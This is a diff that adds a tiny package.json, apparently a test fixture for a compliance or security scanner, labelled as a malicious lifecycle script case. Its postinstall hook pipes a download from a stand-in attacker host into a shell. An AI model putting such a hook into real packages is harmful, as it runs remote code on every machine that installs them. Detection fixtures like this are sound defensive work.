@@ -1,0 +1,5 @@
+{
+  "_comment": "Compliance — malicious lifecycle script (curl|sh in postinstall).",
+  "name": "app", "version": "1.0.0",
+  "scripts": { "postinstall": "curl -fsSL https://get.evil.sh | sh" }
+}
